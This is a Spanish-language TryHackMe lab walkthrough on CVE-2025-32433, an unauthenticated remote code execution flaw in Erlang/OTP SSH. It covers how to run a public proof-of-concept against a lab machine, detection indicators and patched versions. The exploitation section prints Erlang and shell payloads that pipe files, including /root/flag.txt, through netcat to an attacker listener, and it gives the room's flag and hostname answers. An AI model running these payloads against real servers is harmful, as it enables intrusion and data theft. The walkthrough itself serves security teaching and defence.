
# erlangotpsshcve202532433 [EASY]

Aprende y explota la vulnerabilidad CVE-2025-32433 de Erlang/OTP SSH en un entorno de laboratorio.

<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/5f04259cf9bf5b57aed2c476-1745418138356" width="250" alt=" Erlang/OTP SSH">

> **Información de la sala**
> * **Tipo:** Walkthrough (Guía paso a paso)
> * **Acceso:** Sala gratuita. ¡Cualquiera puede desplegar las máquinas!
> * **Creado por:** tryhackme, strategos, TactfulTurtle
> * **Enlace oficial:** [https://tryhackme.com/room/erlangotpsshcve202532433](https://tryhackme.com/room/erlangotpsshcve202532433)
> 
> 
 

## Tarea 1: Introducción / Task 1: Introduction

Erlang y su framework complementario, el Open Telecom Platform (OTP), forman un ecosistema poderoso para construir sistemas distribuidos tolerantes a fallos. Erlang es un lenguaje de programación diseñado para construir sistemas escalables en tiempo real que requieren alta disponibilidad. Originalmente, Erlang fue desarrollado por Ericsson para sistemas de telecomunicaciones; sin embargo, ha evolucionado a lo largo de los años para convertirse en una solución para diversos desafíos de computación distribuida.

Erlang es utilizado no solo por una gran cantidad de empresas para el desarrollo de productos, sino también por muchas universidades para la investigación e incluso la enseñanza. Puedes obtener más información sobre Erlang en su página oficial ([https://www.erlang.org/faq/introduction.html](https://www.erlang.org/faq/introduction.html)).

OTP es una colección de middleware, librerías y herramientas escritas en Erlang. Aunque la T en OTP significa Telecom, OTP ha evolucionado hasta convertirse en un framework de propósito general para la construcción de aplicaciones distribuidas. En general, los proyectos que utilizan Erlang están usando en realidad Erlang junto con sus librerías, es decir, Erlang/OTP.

Erlang/OTP SSH es una implementación del protocolo SSH como parte de Erlang OTP. Permite el acceso seguro por shell y la transferencia segura de archivos dentro de sistemas basados en Erlang. Recientemente, se divulgó la vulnerabilidad CVE-2025-32433 ([https://github.com/erlang/otp/security/advisories/GHSA-37cp-fgq5-7wc2](https://github.com/erlang/otp/security/advisories/GHSA-37cp-fgq5-7wc2)), una vulnerabilidad crítica en la implementación de Erlang/OTP SSH que permite la ejecución remota de código (RCE) no autenticada. Esta vulnerabilidad fue descubierta por investigadores de la Universidad del Ruhr de Bochum y tiene una puntuación CVSS de 10.0 ([https://nvd.nist.gov/vuln/detail/CVE-2025-32433](https://nvd.nist.gov/vuln/detail/CVE-2025-32433)), ya que se considera crítica.

---

## Tarea 2: Trasfondo Técnico y Explotación / Task 2: Technical Background and Exploitation

Esta vulnerabilidad existe debido a la implementación del protocolo SSH por parte de Erlang/OTP, particularmente debido al manejo de los mensajes del protocolo de conexión durante la fase de pre-autenticación. Según este resumen técnico ([https://www.upwind.io/feed/cve-2025-32433-critical-erlang-otp-ssh-vulnerability-cvss-10](https://www.upwind.io/feed/cve-2025-32433-critical-erlang-otp-ssh-vulnerability-cvss-10)), los números de mensaje SSH de 80 en adelante están reservados para la post-autenticación. En consecuencia, si el cliente SSH envía un mensaje SSH con tales números antes de que se complete la autenticación, el servidor SSH debería desconectarlos. Los servidores vulnerables no imponen esto, lo que da a los atacantes muchas ventanas para diseñar sus mensajes y finalmente lograr la ejecución de código no autorizada.

Un código de explotación de prueba de concepto (PoC) fue escrito por Matthew Keeley ([https://platformsecurity.com/blog/CVE-2025-32433-poc](https://platformsecurity.com/blog/CVE-2025-32433-poc)) y se puede encontrar aquí ([https://github.com/ProDefense/CVE-2025-32433](https://github.com/ProDefense/CVE-2025-32433)). El exploit funciona en cuatro etapas; el payload se envía en la cuarta etapa, que ejecuta el código del atacante antes de que se lleve a cabo la autenticación.

**Nota:** Los usuarios gratuitos no pueden acceder a Internet para descargar el código del exploit a sus máquinas AttackBox. Como resultado, sugerimos que accedan a CVE-2025-32433.py ([https://raw.githubusercontent.com/ProDefense/CVE-2025-32433/refs/heads/main/CVE-2025-32433.py](https://raw.githubusercontent.com/ProDefense/CVE-2025-32433/refs/heads/main/CVE-2025-32433.py)) en sus navegadores, copien su contenido y lo peguen en un archivo adecuado en sus máquinas AttackBox en funcionamiento. Los suscriptores Premium y Business pueden seguir los pasos que se muestran a continuación directamente.

Puedes descargar el código del exploit usando `git clone` en la terminal de la AttackBox, como se muestra en la terminal a continuación.

```bash
AttackBox Terminal
root@attackbox:~# git clone https://github.com/ProDefense/CVE-2025-32433
Cloning into 'CVE-2025-32433'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (10/10), done.
remote: Total 12 (delta 3), reused 8 (delta 2), pack-reused 0 (from 0)
Unpacking objects: 100% (12/12), 4.72 KiB | 483.00 KiB/s, done.

```

A continuación, debemos entrar en el directorio `CVE-2025-32433` y editar el código del exploit `CVE-2025-32433.py` para usar la dirección IP de nuestro objetivo, `MACHINE_IP`, y el número de puerto, `22`. Las primeras seis líneas del archivo actualizado deberían verse como las siguientes.

```bash
AttackBox Terminal
root@attackbox ~/CVE-2025-32433# head -n 6 CVE-2025-32433.py
import socket
import struct
import time

HOST = "MACHINE_IP"  # Target IP (change if needed)
PORT = 22  # Target port (change if needed)
[...]

```

Ahora, estamos listos para ejecutar nuestro exploit. Debido a que esto es una PoC, el payload es relativamente inofensivo; crea el archivo `lab.txt` con el contenido "pwned". Estamos accediendo a un sistema Erlang a través de SSH; por lo tanto, como es de esperar, el payload está escrito en lenguaje Erlang: `file:write_file("/lab.txt", <<"pwned">>).`. Si deseas crear un payload más sofisticado, también debes escribirlo en Erlang. A continuación se muestra un ejemplo de la explotación exitosa de la VM objetivo.

```bash
AttackBox Terminal
root@attackbox ~/CVE-2025-32433# python3 CVE-2025-32433.py
[*] Connecting to SSH server...
[+] Received banner: SSH-2.0-Erlang/5.2.9
[*] Sending SSH_MSG_KEXINIT...
[*] Sending SSH_MSG_CHANNEL_OPEN...
[*] Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...
[✓] Exploit sent! If the server is vulnerable, it should have written to /lab.txt.
[+] Received response:
[...]

```

### Confirmando la Vulnerabilidad / Confirming the Vulnerability

Después de ejecutar el código del exploit anterior en la VM adjunta, nos gustaría confirmar que tuvo éxito. Esto sería trivial si tuviéramos acceso al sistema; sin embargo, para ejecutar las cosas desde la perspectiva del adversario, asumamos que no tenemos tal acceso. Necesitamos otras formas de comprobar si nuestro archivo se ha creado correctamente.

Un enfoque para confirmar la existencia del archivo `/lab.txt` y ver su contenido es configurar un listener en la AttackBox. Escuchemos en el puerto 4444 en la AttackBox usando `nc -lvp 4444`.

```bash
AttackBox Terminal
root@attackbox:~# nc -lvp 4444
Listening on 0.0.0.0 4444

```

Nuestro siguiente paso sería adaptar el payload a algo más útil. Podemos reemplazar la instrucción de Erlang para escribir un archivo, `file:write_file("/lab.txt", <<"pwned">>).`, con otra que envíe el contenido del archivo `lab.txt` a nuestro listener. En Erlang, `os:cmd` nos permite ejecutar comandos del sistema; por lo tanto, podemos usar `os:cmd("cat /lab.txt | nc CONNECTION_IP 4444").` para confirmar la existencia y el contenido del archivo `lab.txt` creado.

Por favor, recuerda añadir `.` al final de cada instrucción de Erlang. En otras palabras, en la línea 108, `command = 'file:write_file("/lab.txt", <<"pwned">>).'` debe actualizarse a `command='os:cmd("cat /lab.txt | nc CONNECTION_IP 4444").'` para canalizar el contenido de `lab.txt` a `nc`.

**Preguntas:**

* **¿Cuál es la flag oculta en el directorio root?**
* Payload: `cat /root/flag.txt | nc IP 4444`
* **Respuesta:** `THM{U57U3P5KnR}`

* **¿Cuál es el hostname del sistema?**
* Usa `hostname`.
* **Respuesta:** `c7b79fd068ba`

---

## Tarea 3: Detección / Task 3: Detection

### Detección Basada en Red / Network-Based Detection

El ataque se basa en una capa de implementación del protocolo SSH, por lo que los registros del demonio SSH no proporcionarían evidencia de explotación confiable. Aun así, el ataque puede ser rastreado revisando el tráfico de red, donde se vería el paquete "SSH_MSG_CHANNEL_REQUEST" viniendo de un atacante hacia tu servidor. El paquete contendrá un payload que comienza con la palabra clave "exec" y termina con el comando exacto a ser ejecutado en el objetivo en texto plano.

[https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1745437299719.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1745437299719.png)

Los proveedores de firewalls están implementando gradualmente reglas NIDS/NIPS basadas en los indicadores descritos, y los investigadores están proponiendo alternativas para Suricata. Por ejemplo:

* Regla IPS de FortiGate: [Sitio web de FortiGuard](https://www.fortiguard.com/encyclopedia/ips/57832)
* Ejemplo de regla IPS para Suricata: [Repositorio de Github](https://github.com/darses/CVE-2025-32433/blob/main/suricata.rules)

### Detección Basada en Host / Host-Based Detection

Además del enfoque NIDS/NIPS, el ataque puede ser detectado en etapas posteriores. Dado que la vulnerabilidad afecta principalmente a dispositivos de red que suelen controlar una red o uno de sus segmentos, los atacantes pueden usar los dispositivos explotados como punto de partida para entrar en tu Active Directory, entorno de producción u otro segmento de red sensible.

**En el dispositivo explotado (Si tienes acceso al sistema de archivos):**

* Cambios inesperados en los archivos o nuevos archivos ejecutables creados después de la divulgación del CVE.
* Persistencias específicas del SO, como cronjobs para Linux, creados después de la divulgación del CVE.
* Tráfico de red sospechoso proveniente del dispositivo hacia IPs externas no reconocidas.

**En otros servidores conectados al dispositivo:**

* Inicios de sesión inesperados o escaneos de red desde el dispositivo de red hacia los servidores monitoreados.
* Problemas de red como errores de conexión, desconfiguraciones de enrutamiento o alta latencia.

---

## Tarea 4: Mitigación / Task 4: Mitigation

Muchos productos de hardware y software utilizan Erlang/OTP; desafortunadamente, algunos de estos productos tienen su SSH expuesto al mundo exterior. Debes confirmar si el SSH está habilitado en tus productos y si se ve afectado. Las versiones de OTP afectadas por esta vulnerabilidad son todas las versiones anteriores e incluyendo las siguientes:

* OTP-27.3.2
* OTP-26.2.5.10
* OTP-25.3.2.19

Los usuarios deben actualizar sus sistemas a una versión parcheada para mitigar este problema. Las versiones parcheadas disponibles son las siguientes:

* OTP-27.3.3
* OTP-26.2.5.11
* OTP-25.3.2.20

Se aconseja a los usuarios deshabilitar el servidor SSH si no es factible realizar una actualización. Cuando esto sea imposible, los usuarios deben bloquear el acceso al servidor SSH mediante las reglas de firewall adecuadas.

**Nota:** Si disfrutaste aprendiendo sobre esta vulnerabilidad, te recomendamos que consultes el módulo de Amenazas Recientes ([https://tryhackme.com/module/recent-threats](https://tryhackme.com/module/recent-threats)).

 